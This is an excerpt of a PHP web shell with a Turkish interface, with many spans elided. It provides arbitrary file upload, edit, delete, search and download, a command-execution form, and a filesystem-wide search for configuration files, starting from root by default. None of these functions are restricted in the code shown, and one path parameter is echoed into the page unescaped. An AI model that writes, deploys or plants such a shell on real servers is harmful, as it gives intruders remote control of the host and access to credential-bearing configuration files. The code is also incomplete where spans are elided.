...
$uploadMessage = $editMessage = $deleteMessage = $cmdMessage = $searchMessage = $permissionsMessage = $downloadMessage = $configSearchMessage = "";
...
if (isset($_GET['edit_file_path'])) {
    $filePath = $_GET['edit_file_path'];
    if (file_exists($filePath)) {
...
if (isset($_POST['cmd_input']) && !empty($_POST['cmd_input'])) {
    ...
    $cmdMessage = "<pre>" . htmlspecialchars($output) . "</pre>";
} else {
    $cmdMessage = "Komut girilmedi.";
}
...
function searchConfigFiles($dir, &$matches) {
    ...
    try {
        ...
        foreach ($iterator as $file) {
            ...
            if (in_array($file->getExtension(), ['cfg', 'conf', 'cnf'])) {
                $matches[] = $file->getPathname();
            }
        }
    } catch (UnexpectedValueException $e) {
        
        echo "Erişim hatası: " . $e->getMessage();
    }
}

if (isset($_POST['config_search']) && isset($_POST['config_directory'])) {
    
    $directory = $_POST['config_directory'] ?: '/';
    
    
    $matches = [];
    
  
    searchConfigFiles($directory, $matches);
    
    if (count($matches) > 0) {
       
        $configSearchMessage = "<table><thead><tr><td>Bulunan Konfigürasyon Dosyaları</td></tr></thead><tbody>";
        foreach ($matches as $name) {
            $configSearchMessage .= "<tr><td width=90%>" . htmlspecialchars($name) . "</td></tr>";
        }
        $configSearchMessage .= "</tbody></table>";
    } else {
        
        $configSearchMessage = "Hiçbir konfigürasyon dosyası bulunamadı.";
    }
}
...
<div class="container">
    ...
    <div class="menu-bar">
        ...
        <button onclick="toggleSection('permissions-section')">Dosya İzinleri</button>
        ...
        <button onclick="toggleSection('config-search-section')">Konfig Dosyası Ara</button> 
    
    </div> 
    <div id="config-search-section" class="section">
        <h3>Konfig Dosyası Ara</h3>
        <form method="POST">
            <input type="text" name="config_directory" placeholder="Arama dizinini girin (varsayılan: .)" class="command-box"><br><br>
            <input type="submit" name="config_search" value="Ara" class="button">
        </form>
        <?php if ($configSearchMessage) echo "<div class='message'>$configSearchMessage</div>"; ?>
    </div>
    <div id="help-section" class="section" > 
        <h3>Yardım</h3> 
        <p style="color:rgb(0, 255, 0)">Bu sayfada; <br> Dosya Yükleme, 
        <br>Düzenleme, <br>Silme, <br>Arama, <br>İzinleri Gösterme, 
        <br>Komut Çalıştırma ve Dosya İndirme İşlemleri Yapabilirsiniz.</p> 
    </div>
    </div>
    ...
    <div id="upload-section" class="section">
        ...
        <form enctype="multipart/form-data" method="POST">
            <input type="file" name="new_file" class="command-box"><br><br>
    ...
    <div id="edit-section" class="section">
        <h3>Dosya Düzenle</h3>
        <form method="POST">
            <input type="text" name="file_path" placeholder="Dosya yolunu girin" class="command-box" value="<?php echo $_GET['edit_file_path'] ?? ''; ?>"><br><br>
            <textarea name="new_content" placeholder="Yeni içeriği girin" class="command-box"><?php echo $currentContent ?? ''; ?></textarea><br><br>
    ...
    <div id="delete-section" class="section">
        <h3>Dosya Sil</h3>
        <form method="POST">
            <input type="text" name="file_path" placeholder="Silinecek dosya yolunu girin" class="command-box"><br><br>
    ...
    <div id="search-section" class="section">
        <h3>Dosya Ara</h3>
        <form method="POST">
            <input type="text" name="search_term" placeholder="Aranacak terimi girin" class="command-box"><br><br>
    ...
    <div id="permissions-section" class="section">
        ...
        <form method="POST">
            <input type="text" name="file_path_permissions" placeholder="Dosya yolunu girin" class="command-box"><br><br>
    ...
    <div id="download-section" class="section">
        <h3>Dosya İndir</h3>
        <form method="POST">
            <input type="text" name="download_path" placeholder="İndirilecek dosya yolunu girin" class="command-box"><br><br>
